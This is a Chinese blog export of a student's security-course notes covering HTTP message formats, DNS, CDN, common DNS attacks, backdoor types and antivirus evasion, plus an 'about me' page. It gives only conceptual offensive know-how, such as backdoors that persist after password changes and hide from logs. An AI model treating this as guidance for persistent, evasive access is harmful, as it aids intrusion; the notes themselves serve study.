响应之后先解码，然后再检查文件格式。</li></ul></li></ol><h3 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h3><ul><li>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</li></ul><h3 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h3><ul><li>使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /zb_system/cmd.php?act=search HTTP/1.1 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 </span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 </span><br><span class="line">Cache-Control: max-age=0 </span><br><span class="line">Connection: keep-alive </span><br><span class="line">Content-Length: 3 </span><br><span class="line">Content-Type: application/x-www-form-urlencoded </span><br><span class="line">Cookie: ZDEDebuggerPresent=php,phtml,php3 </span><br><span class="line">Host: www.xiaodi8.com </span><br><span class="line">Origin: http://xiaodi8.com </span><br><span class="line">Referer: http://xiaodi8.com/ </span><br><span class="line">Upgrade-Insecure-Requests: 1 </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62</span><br><span class="line"></span><br><span class="line">q=1</span><br></pre></td></tr></table></figure></li></ul><h2 id="Response返回数据包数据格式"><a href="#Response返回数据包数据格式" class="headerlink" title="Response返回数据包数据格式"></a>Response返回数据包数据格式</h2><ul><li>一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</li></ul><ol><li>状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔  </li><li>响应头标：包含服务器类型、日期、长度、内容类型等  </li><li>空行：响应头与响应体之间用空行隔开  </li><li>响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Response Header</span><br><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Date: Tue, 29 Aug 2023 07:57:46 GMT </span><br><span class="line">Server: Apache/2.4.46 (Win32) OpenSSL/1.1.1g mod_fcgid/2.3.9a </span><br><span class="line">X-Powered-By: PHP/5.4.45 </span><br><span class="line">Product: Z-BlogPHP 1.6.6 Valyria </span><br><span class="line">X-XSS-Protection: 1; mode=block </span><br><span class="line">Set-Cookie: ZDEDebuggerPresent=php,phtml,php3; path=/ </span><br><span class="line">Upgrade: h2,h2c </span><br><span class="line">Connection: Upgrade, Keep-Alive </span><br><span class="line">Vary: Accept-Encoding </span><br><span class="line">Content-Encoding: gzip </span><br><span class="line">Content-Length: 3157 </span><br><span class="line">Keep-Alive: timeout=5, max=100 </span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure></li></ol><ul><li>响应数据<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20160122.png" alt="响应数据"></li></ul><h3 id="HTTP响应码"><a href="#HTTP响应码" class="headerlink" title="HTTP响应码"></a>HTTP响应码</h3><pre><code>1xx：信息，请求收到，继续处理  2xx：成功，行为被成功地接受、理解和采纳  3xx：重定向，为了完成请求，必须进一步执行的动作  4xx：客户端错误  5xx：服务器错误-200 存在文件403 存在文件夹3xx 均可能存在404 不存在文件及文件夹500 均可能存在</code></pre><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%201609461.png" alt="响应码"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20161415.png"></p><hr><p>笔记内容参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a>、<a href="https://mp.weixin.qq.com/s/hF0sNnZbqnNfSqzZlzYsmA">0x00实验室</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day01基础入门-概念名词</title>
      <link href="/2023/08/28/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/"/>
      <url>/2023/08/28/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="概念名词"><a href="#概念名词" class="headerlink" title="概念名词"></a>概念名词</h1><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><h3 id="什么是域名"><a href="#什么是域名" class="headerlink" title="什么是域名"></a>什么是域名</h3><p>相当于网站的名字维基百科对域名的解释是：互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。<br>网域名称系统（Domain Name System）有时也简称为域名（DNS），是互联网的一项核心服务，它作为可以将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网，而不用去记住能够被机器直接读取的 IP 地址数据串。</p><h3 id="域名在哪里注册？"><a href="#域名在哪里注册？" class="headerlink" title="域名在哪里注册？"></a>域名在哪里注册？</h3><ol><li>Godaddy</li><li>Gandi</li><li>Hover</li><li>Namesilo</li><li>Namecheap</li><li>万网</li></ol><h3 id="什么是二级域名多级域名？"><a href="#什么是二级域名多级域名？" class="headerlink" title="什么是二级域名多级域名？"></a>什么是二级域名多级域名？</h3><ol><li>顶级域名:又叫一级域名,一串字符串中间一个点隔开,例如 baidu.com。顶级域名是互联网DNS等级之中的最高级的域,它保存于DNS根域的名字空间中。</li><li>二级域名:实际上就是一个一级域名以下的主机名,一串字符串中间两个“.”隔开,例如 <a href="http://www.baidu.com/">www.baidu.com</a> 。二级域名就是最靠近顶级域名左侧的字段。</li><li>三级域名:二级域名的子域名,特征是包含三个“.”,例如___.___.baidu.com…</li></ol><h3 id="域名发现对于安全测试意义？"><a href="#域名发现对于安全测试意义？" class="headerlink" title="域名发现对于安全测试意义？"></a>域名发现对于安全测试意义？</h3><p>进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，有可能测试子域名网站时会有意向不到的效果，然后可以由此横向到主网站。</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><h3 id="什么是DNS？"><a href="#什么是DNS？" class="headerlink" title="什么是DNS？"></a>什么是DNS？</h3><p>域名系统(Domain Name System,DNS)是Internet上解决网上机器命名的一种系统。 就像拜访朋友要先知道别人家怎么走一样，Internet上当一台主机要访问另外一台主机时，必须首先获知其地址，TCP&#x2F;IP中的IP地址是由四段以“.”分开的数字组成(此处以IPv4的地址为例，IPv6的地址同理)，记起来总是不如名字那么方便，所以，就采用了域名系统来管理名字和IP的对应关系。</p><h3 id="本地Hosts与DNS的关系"><a href="#本地Hosts与DNS的关系" class="headerlink" title="本地Hosts与DNS的关系"></a>本地Hosts与DNS的关系</h3><ol><li>Hosts文件主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。</li><li>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</li><li>浏览器访问网站，要首先通过DNS服务器把要访问的网站域名解析成一个唯一的IP地址，之后，浏览器才能对此网站进行定位并且访问其数据。<br><strong>如何查看本地Hosts文件：</strong></li><li><code>Win</code> + <code>R</code>：打开运行输入<code>drivers</code></li><li>输入：<code>c:\windows\system32\drivers\etc</code></li><li>选择使用<code>记事本</code>或者<code>Notepad</code>、<code>Vs Code</code> 等编程软件打开<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-28%20143352.png" alt="截图"></li></ol><h3 id="CDN是什么？与DNS的关系？"><a href="#CDN是什么？与DNS的关系？" class="headerlink" title="CDN是什么？与DNS的关系？"></a>CDN是什么？与DNS的关系？</h3><ol><li>CDN的全称是Content DeliveryNetwork，即内容分发网络。</li><li>CDN的基本思路：是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。</li><li>通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上（单纯只使用DNS解析，直接PING就会显示出自己的真实IP,如果又使用CDN，PING出来的IP就不是用户的真实IP而是CDN服务器的IP节点。需要绕过CDN后去找真实IP地址。</li><li>使用CDN的目的：是使用户可就近取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的响应速度。<br>通过超级ping的网站可以看到CDN的解析情况<a href="https://www.ping.cn/ping/cdivtc.com">https://www.ping.cn/ping/cdivtc.com</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-28%20144311.png" alt="截图"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-28%20144614.png" alt="截图"></li></ol><h3 id="常见的DNS安全攻击有哪些？"><a href="#常见的DNS安全攻击有哪些？" class="headerlink" title="常见的DNS安全攻击有哪些？"></a>常见的DNS安全攻击有哪些？</h3><h4 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h4><p>DDoS攻击也叫做分布式拒绝服务攻击，可以使很多的计算机在同一时间遭受到攻击，使攻击的目标无法正常使用。攻击者可以伪造自己的DNS服务器地址，同时发送大量请求给其他服务器。其他服务器的回复会被发送到被伪造服务器的真实地址，造成该服务器无法处理请求而崩溃。攻击者同样可以通过利用DNS协议中存在的漏洞，恶意创造一个载荷过大的请求，造成目标DNS服务器崩溃。</p><h4 id="DNS缓存中毒"><a href="#DNS缓存中毒" class="headerlink" title="DNS缓存中毒"></a>DNS缓存中毒</h4><p>DNS缓存中毒攻击者给DNS服务器注入非法网络域名地址，如果服务器接受这个非法地址，那说明其缓存就被攻击了，而且以后响应的域名请求将会受黑客所控。当这些非法地址进入服务器缓存，用户的浏览器或者邮件服务器就会自动跳转到DNS指定的地址。这种攻击往往被归类为域欺骗攻击(pharming attack)，由此它会导致出现很多严重问题。首先，用户往往会以为登陆的是自己熟悉的网站，而它们却并不是。与钓鱼攻击采用非法URL不同的是，这种攻击使用的是合法的URL地址。</p><h4 id="域名劫持（DNS重定向）"><a href="#域名劫持（DNS重定向）" class="headerlink" title="域名劫持（DNS重定向）"></a>域名劫持（DNS重定向）</h4><p>域名劫持是通过攻击域名解析服务器（DNS），或伪造域名解析服务器（DNS）的方法，把目标网站域名解析到错误的地址从而实现用户无法访问目标网站的目的。域名劫持一方面可能影响用户的上网体验，用户被引到假冒的网站进而无法正常浏览网页，而用户量较大的网站域名被劫持后恶劣影响会不断扩大；另一方面用户可能被诱骗到冒牌网站进行登录等操作导致泄露隐私数据。</p><h4 id="DNS查询嗅探"><a href="#DNS查询嗅探" class="headerlink" title="DNS查询嗅探"></a>DNS查询嗅探</h4><ol><li>攻击者主要利用对DNS的配置信息获取网络环境的信息，为之后的攻击做好的准备。</li><li>针对这些情况，我们需要对DNS服务器需要采取特别的安全保护措施，在防火墙网络中，分开设置内部DNS服务器和外部DNS服务器，连接外部服务的外部DNS服务器上不留有对外禁止访问的内部网络系统的服务器，做到内外网络服务器分割。</li></ol><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><ol><li>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。ARP攻击主要是存在于局域网网络中，局域网中若有一台计算机感染ARP病毒，则感染该ARP病毒的系统将会试图通过”ARP欺骗”手段截获所在网络内其它计算机的通信信息，并因此造成网内其它计算机的通信故障。</li><li>ARP欺骗通常是在用户局网中，造成用户访问域名的错误指向。如果IDC机房也被ARP病毒入侵后，则也可能出现攻击者采用ARP包压制正常主机、或者压制DNS服务器，以使访问导向错误指向的情况。</li></ol><h4 id="本机劫持"><a href="#本机劫持" class="headerlink" title="本机劫持"></a>本机劫持</h4><p>本机的计算机系统被木马或流氓软件感染后，也可能会出现部分域名的访问异常。</p><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><h3 id="常见脚本语言"><a href="#常见脚本语言" class="headerlink" title="常见脚本语言"></a>常见脚本语言</h3><ol><li>一种介乎于 <code>HTML</code> 和诸如 <code>Java</code> 、 <code>Visual Basic</code> 、 <code>C++</code>等编程语言之间的一种特殊的语言。</li><li>尽管它更接近后者，但它却不具有编程语言复杂、严谨的语法和规则。</li><li>常见的脚本语言有：<code>Python</code>、<code>JavaScript</code>、<code>Asp</code> (逐渐淘汰，基本都是小站点在使用)、<code>Aspx</code>、<code>PHP</code> （目前比较流行）<code>javaweb</code>、 <code>pl</code>、<code>cgi</code>等</li></ol><h3 id="不同脚本类型与安全漏洞的关系"><a href="#不同脚本类型与安全漏洞的关系" class="headerlink" title="不同脚本类型与安全漏洞的关系"></a>不同脚本类型与安全漏洞的关系</h3><ul><li>不同的脚本语言的编写规则不一样，程序产生的漏洞自然也不一样（代码审计）。</li></ul><h3 id="漏洞挖掘代码审计与脚本类型的关系"><a href="#漏洞挖掘代码审计与脚本类型的关系" class="headerlink" title="漏洞挖掘代码审计与脚本类型的关系"></a>漏洞挖掘代码审计与脚本类型的关系</h3><ul><li>漏洞挖掘代码审计：要熟悉相关代码和相关逻辑机制</li></ul><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><h3 id="什么是后门？有那些后门？"><a href="#什么是后门？有那些后门？" class="headerlink" title="什么是后门？有那些后门？"></a>什么是后门？有那些后门？</h3><ol><li>在信息安全领域，后门是指绕过安全控制而获取对程序或系统访问权的方法。</li><li>后门的最主要目的就是方便以后再次秘密进入或者控制系统。</li></ol><h3 id="后门的分类"><a href="#后门的分类" class="headerlink" title="后门的分类"></a>后门的分类</h3><ol><li><p>网页后门 ：<br> 此类后门程序一般都是服务器上正常 的web服务来构造自己的连接方式，比如现在非常流行的ASP、cgi脚本后门等。</p></li><li><p>线程插入后门：<br> 利用系统自身的某个服务或者线程，将后门程序插入到其中，具体原理原来《黑客防线》曾具体讲解过，感兴趣的朋友可以查阅。这也是现在最流行的一个后门技术。</p></li><li><p>扩展后门：<br> 所谓的“扩展”，是指在功能上有大的提升，比普通的单一功能的后门有很强的使用性，这种后门本身就相当于一个小的安全工具包，能实现非常多的常驻见安全功能，适合新手使用————但是，功能越强，个人觉得反而脱郭后门“隐蔽”的初衷，具体看法就看各位使用都的喜好了。</p></li><li><p>C&#x2F;S后门（客户端服务器后门）：<br> 和传统的木马程序类似的控制方法，采用“客记端&#x2F;服务端”的控制方式，通过某种特定的访问方式来启动后门进而控制服务器。</p></li></ol><h3 id="后门在安全测试中的实际意义"><a href="#后门在安全测试中的实际意义" class="headerlink" title="后门在安全测试中的实际意义"></a>后门在安全测试中的实际意义</h3><ol><li>方便下次更方便的进来。</li><li>获取到相关权限之后，后门相当于一个管道，便于操作。</li><li>即使管理员通过改变所有密码之类的方法来提高安全性，仍然能再次侵入，使再次侵入被发现的可能性减至最低。</li><li>大多数后门设法躲过日志，大多数情况下即使入侵者正在使用系统也无法显示他已在线。</li></ol><h3 id="关于后门需要了解那些？-玩法，免杀"><a href="#关于后门需要了解那些？-玩法，免杀" class="headerlink" title="关于后门需要了解那些？(玩法，免杀)"></a>关于后门需要了解那些？(玩法，免杀)</h3><ol><li><p>玩法（创建后门之后我们可以怎么样操作？）<br> 网站后门：便于控制网站<br> 软件后门：用于控制<br> 服务器后门：可以进行脱库、盗取信息</p></li><li><p>免杀技术全称为反杀毒技术Anti Anti-Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。</p></li><li><p>由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。</p></li><li><p>其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。</p></li><li><p>后门需要掌握的核心技能，防止杀毒软件检查到</p></li></ol><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web的组成框架模型"><a href="#web的组成框架模型" class="headerlink" title="web的组成框架模型"></a>web的组成框架模型</h3><ul><li>WEB的组成框架模型：网站原码、操作系统、中间件（搭建平台，提供服务的）、数据库。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/web%E7%9A%84%E7%BB%84%E6%88%90%E6%A1%86%E6%9E%B6.png" alt="Web的组成框架"></li></ul><h3 id="架构漏洞安全测试的简要测试"><a href="#架构漏洞安全测试的简要测试" class="headerlink" title="架构漏洞安全测试的简要测试"></a>架构漏洞安全测试的简要测试</h3><ol><li><p>通信层<br> 主要测试通信协议的安全，系统开放的端口，其中操作系统提供网络层和数据链路层协议，存在问题的可能性较小，一般关注开源协议已存在漏洞即可，无需重点关注。应用层服务与协议一般由产品形态决定，产品中可以自定义配置相关协议与参数，需要重点关注与测试。</p></li><li><p>应用层<br> 应用层包含开发人员开发代码，为整个安全测试的核心模块。主要包括web安全测试，源码安全测试。其中web安全测试从web访问服务的维度，偏向黑盒，进行安全测试。源码安全测试从代码的维度，偏向白盒，进行安全测试。</p></li><li><p>系统层<br> 主要测试操作系统安全，数据库服务安全，web服务器安全，以及其他一些中间件的安全。</p></li><li><p>管理层<br> 主要包括产品资料的安全测试，安全策略制定，协调各个层面的安全测试以及安全风险的整体评估。</p></li></ol><h3 id="为什么要从web界面为主"><a href="#为什么要从web界面为主" class="headerlink" title="为什么要从web界面为主"></a>为什么要从web界面为主</h3><p>因为web使用方面广 。从web方向先入手，一步一步的获取最高权限。</p><h2 id="Web相关漏洞"><a href="#Web相关漏洞" class="headerlink" title="Web相关漏洞"></a>Web相关漏洞</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/web%E6%BC%8F%E6%B4%9E.png" alt="Web相关漏洞"></p><h2 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h2><h3 id="多级域名的枚举查找"><a href="#多级域名的枚举查找" class="headerlink" title="多级域名的枚举查找"></a>多级域名的枚举查找</h3><ul><li>layer子域名探测<br>链接：<a href="https://pan.baidu.com/s/1YFu9V0WtdG905eaVFNFa0A">https://pan.baidu.com/s/1YFu9V0WtdG905eaVFNFa0A</a><br>提取码：zkaq<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-28%20201908.png" alt="layer子域名挖掘机"></li></ul><hr><p>笔记内容参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关于我的</title>
      <link href="/2023/08/25/%E6%9C%89%E5%85%B3%E4%BA%8E%E6%88%91%E7%9A%84/"/>
      <url>/2023/08/25/%E6%9C%89%E5%85%B3%E4%BA%8E%E6%88%91%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<h1 id="有关于我的"><a href="#有关于我的" class="headerlink" title="有关于我的"></a>有关于我的</h1><hr><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E6%A2%A6%E6%AF%94%E4%BC%98%E6%96%AF.jpg" alt="Alien"></p><blockquote><p>永远相信美好的事情即将发生，因为追求源于热爱！</p></blockquote><h3 id="关于Alien"><a href="#关于Alien" class="headerlink" title="关于Alien"></a>关于Alien</h3><p>你好，我叫Alien，是个在校大学生，开发者，2021年开始学习相关开发知识。</p><ul><li><strong>就读院校：</strong> 东莞理工学院（是本科！！！）</li><li><strong>本科专业：</strong> 网络空间安全</li><li><strong>个人爱好：</strong> 听歌、看电影、奥特曼、游戏</li></ul><h3 id="细说个人爱好"><a href="#细说个人爱好" class="headerlink" title="细说个人爱好"></a>细说个人爱好</h3><p>喜欢的音乐人主要是周杰伦、林俊杰、陈奕迅、五月天、张杰、Zard坂井泉水（我女神）、久石让（他的音乐真的很好听）、Radwimps、米津玄师，平时没事就听歌，可以说是个终身爱好了。<br>喜欢的电影有幽灵公主（强烈推荐）、哈尔的移动城堡、天空之城。（很不巧，都是宫崎骏的）<br>游戏玩的不多，像云顶之弈这种比较多人玩，比较喜欢单机的游戏，比如极限竞速：地平线、塞尔达传说：王国之泪、GTA5。<br>应该没有人不喜欢奥特曼吧！（\狗头）</p><h3 id="怎样能够联系到我呢？"><a href="#怎样能够联系到我呢？" class="headerlink" title="怎样能够联系到我呢？"></a>怎样能够联系到我呢？</h3><p>邮箱：<a href="mailto:&#x31;&#49;&#x39;&#x33;&#49;&#51;&#x33;&#49;&#48;&#53;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;">&#x31;&#49;&#x39;&#x33;&#49;&#51;&#x33;&#49;&#48;&#53;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;</a><br>Github：<a href="https://github.com/M78Alien">M78Alien</a><br>B站：<a href="https://space.bilibili.com/360390916?spm_id_from=333.1007.0.0">Alien船长大人</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
